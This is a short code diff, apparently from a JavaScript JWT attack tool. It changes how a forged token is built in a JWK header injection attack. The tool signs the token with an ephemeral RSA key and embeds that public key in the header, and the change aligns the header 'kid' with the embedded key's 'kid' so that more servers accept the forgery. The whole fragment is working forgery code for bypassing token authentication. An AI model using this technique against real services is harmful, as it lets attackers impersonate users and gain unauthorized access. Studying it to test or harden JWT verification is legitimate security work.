@@ -2317,15 +2317,17 @@
                     } else {
                         applyPayloadChanges();
                         modifiedHeader.alg = 'RS256';
-                        modifiedHeader.jwk = currentRSAKey.jwk;
-                        // Use existing kid if present, or generate/reuse
-                        if (!modifiedHeader.kid) modifiedHeader.kid = 'jwt-attack-forge-key';
+                        
+                        // Sync kids: The header kid MUST match the jwk kid for most servers
+                        const jwkCopy = { ...currentRSAKey.jwk };
+                        modifiedHeader.jwk = jwkCopy;
+                        modifiedHeader.kid = jwkCopy.kid;
                         
                         const h = base64UrlEncode(JSON.stringify(modifiedHeader));
                         const p = base64UrlEncode(JSON.stringify(modifiedPayload));
                         const signature = await rs256Sign(`${h}.${p}`, currentRSAKey.privateKey);
                         resultToken = `${h}.${p}.${signature}`;
-                        notes.push('✅ Token signed with ephemeral RSA key and JWK injected');
+                        notes.push('✅ Token signed; Header "kid" synchronized with embedded "jwk.kid"');
                     }
                     break;
                 }
